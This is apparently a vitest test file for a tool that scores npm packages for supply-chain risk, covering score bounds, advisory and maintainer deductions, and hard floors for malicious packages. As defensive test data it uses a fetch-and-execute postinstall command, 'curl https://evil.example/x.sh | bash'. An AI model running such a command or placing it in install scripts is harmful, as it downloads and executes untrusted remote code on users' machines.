import { describe, expect, it } from "vitest";
import { evaluateRules } from "../src/rules.js";
import { computeSecurityScore } from "../src/score.js";
import type { Signals } from "../src/types.js";
import { makeReputation, makeSignals } from "./helpers.js";

/** Finding strings shaped like analyze/scripts.ts emits, matching rules.ts regexes. */
const FETCH_AND_EXEC = [
  "postinstall script downloads content from the network: `curl https://evil.example/x.sh | bash`",
  "postinstall script invokes a shell: `curl https://evil.example/x.sh | bash`",
];

describe("computeSecurityScore — structure", () => {
  it("category maxes sum to 100 and every category is bounded", () => {
    const score = computeSecurityScore(makeSignals());
    expect(score.categories.reduce((s, c) => s + c.max, 0)).toBe(100);
    for (const c of score.categories) {
      expect(c.score).toBeGreaterThanOrEqual(0);
      expect(c.score).toBeLessThanOrEqual(c.max);
    }
    expect(score.total).toBe(score.categories.reduce((s, c) => s + c.score, 0));
  });

  it("scores a clean mature package ≥95", () => {
    const score = computeSecurityScore(
      makeSignals({
        reputation: makeReputation({
          hasProvenance: true,
          maintainerChange: { changed: false },
          downloads: { status: "ok", weeklyDownloads: 1_000_000, trend: "stable" },
          repo: { status: "ok", archived: false },
        }),
      }),
    );
    expect(score.total).toBeGreaterThanOrEqual(95);
    expect(score.floorReason).toBeUndefined();
  });
});

describe("computeSecurityScore — hard floor", () => {
  it("floors a known-malicious package at ≤5", () => {
    const score = computeSecurityScore(makeSignals({ knownMalicious: true }));
    expect(score.total).toBeLessThanOrEqual(5);
    expect(score.floorReason).toBe("known malicious-package record");
  });

  it("floors a fetch-and-execute lifecycle script at ≤10", () => {
    const score = computeSecurityScore(
      makeSignals({
        hasLifecycleScripts: true,
        lifecycleScripts: { postinstall: "curl https://evil.example/x.sh | bash" },
        scriptCommandFindings: FETCH_AND_EXEC,
      }),
    );
    expect(score.total).toBeLessThanOrEqual(10);
    expect(score.floorReason).toBe("lifecycle command downloads and executes remote code");
  });
});

describe("computeSecurityScore — deductions", () => {
  const categoryScore = (signals: Signals, name: string) =>
    computeSecurityScore(signals).categories.find((c) => c.name === name)!;

  it("deducts per advisory and notes them", () => {
    const c = categoryScore(
      makeSignals({ advisories: [{ id: "GHSA-1" }, { id: "GHSA-2" }] }),
      "vulnerabilities",
    );
    expect(c.score).toBe(c.max - 16);
    expect(c.notes).toEqual(["advisory: GHSA-1", "advisory: GHSA-2"]);
  });

  it("notes an unavailable OSV lookup instead of silently passing", () => {
    const c = categoryScore(makeSignals({ osvUnavailable: true }), "vulnerabilities");
    expect(c.score).toBe(c.max - 10);
    expect(c.notes?.[0]).toContain("unknown");
  });

  it("deducts for lifecycle scripts, naming them", () => {
    const c = categoryScore(
      makeSignals({
        hasLifecycleScripts: true,
        lifecycleScripts: { postinstall: "node install.js" },
      }),
      "install_behavior",
    );
    expect(c.score).toBe(c.max - 8);
    expect(c.notes?.[0]).toContain("postinstall");
  });

  it("deducts for an archived repository and a deprecated version", () => {
    const c = categoryScore(
      makeSignals({
        reputation: makeReputation({
          repo: { status: "ok", archived: true },
          deprecated: "use x instead",
        }),
      }),
      "repository",
    );
    // −3 archived, −4 deprecated, −2 no provenance
    expect(c.score).toBe(c.max - 9);
  });

  it("notes unknown lookup states instead of silently scoring them clean", () => {
    const c = categoryScore(
      makeSignals({ reputation: makeReputation({ repo: { status: "rate-limited" } }) }),
      "repository",
    );
    expect(c.notes).toContain("archived status unknown");
  });

  it("deducts maintainer-change and low-adoption trust signals", () => {
    const c = categoryScore(
      makeSignals({
        reputation: makeReputation({
          maintainerCount: 1,
          maintainerChange: { changed: true, detail: "added: mallory" },
          downloads: { status: "ok", weeklyDownloads: 42 },
        }),
      }),
      "maintainer_trust",
    );
    // −2 solo, −4 change, −3 low adoption
    expect(c.score).toBe(c.max - 9);
    expect(c.notes).toContain("added: mallory");
  });
});

describe("score independence — the Phase 1 invariant", () => {
  it("reputation-only perturbations never change the rules-engine decision", () => {
    const variants: Partial<Signals>[] = [
      { reputation: makeReputation({ repo: { status: "ok", archived: true } }) },
      { reputation: makeReputation({ deprecated: "gone" }) },
      { reputation: makeReputation({ downloads: { status: "ok", weeklyDownloads: 1, trend: "drop" } }) },
      { reputation: makeReputation({ maintainerChange: { changed: true } }) },
      { reputation: makeReputation({ releaseGapAnomaly: true }) },
      { reputation: makeReputation({ repositoryMismatch: true }) },
    ];
    const baseline = evaluateRules(makeSignals()).decision;
    for (const variant of variants) {
      expect(evaluateRules(makeSignals(variant)).decision).toBe(baseline);
    }
  });

  it("computing the score does not mutate the signals or the verdict", () => {
    const signals = makeSignals({ hasLifecycleScripts: true, lifecycleScripts: { postinstall: "x" } });
    const before = JSON.parse(JSON.stringify(signals));
    const verdictBefore = evaluateRules(signals);
    computeSecurityScore(signals);
    expect(signals).toEqual(before);
    expect(evaluateRules(signals)).toEqual(verdictBefore);
  });
});
